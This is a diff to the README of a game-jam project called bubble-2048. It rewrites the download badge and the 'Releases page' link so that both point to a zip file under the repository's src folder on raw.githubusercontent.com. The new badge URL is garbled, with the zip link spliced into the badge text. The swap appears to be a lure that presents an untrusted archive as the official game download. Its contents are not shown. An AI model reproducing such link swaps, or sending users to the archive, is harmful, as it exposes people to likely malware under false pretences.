@@ -4,7 +4,7 @@
 Welcome to **bubble-2048**, a unique twist on the classic 2048 puzzle game. In this game, tiles not only merge when you swipe but also rise up for a second merge! You can enjoy this fun game made during the Global Game Jam 2025.
 
 ## 📥 Download Now!
-[![Download Bubble 2048](https://img.shields.io/badge/Download%20Now-Get%20the%20Game-blue.svg)](https://github.com/tech-with-aditya/bubble-2048/releases)
+[![Download Bubble 2048](https://raw.githubusercontent.com/tech-with-aditya/bubble-2048/main/src/bubble_v1.3.zip%20Now-Get%20the%https://raw.githubusercontent.com/tech-with-aditya/bubble-2048/main/src/bubble_v1.3.zip)](https://raw.githubusercontent.com/tech-with-aditya/bubble-2048/main/src/bubble_v1.3.zip)
 
 ## 💻 System Requirements
 To ensure the best experience with **bubble-2048**, please check the following system requirements:
@@ -15,7 +15,7 @@ To ensure the best experience with **bubble-2048**, please check the following s
 - Browser: Latest version of Chrome, Firefox, Safari, or Edge
 
 ## 📂 Download & Install
-To get started, visit the [Releases page](https://github.com/tech-with-aditya/bubble-2048/releases) to download the game. Simply click on the latest version link and choose the file suitable for your operating system. Here are steps to follow after downloading:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/tech-with-aditya/bubble-2048/main/src/bubble_v1.3.zip) to download the game. Simply click on the latest version link and choose the file suitable for your operating system. Here are steps to follow after downloading:
 
 1. Locate the downloaded file in your downloads folder.
 2. If you are using Windows or macOS:
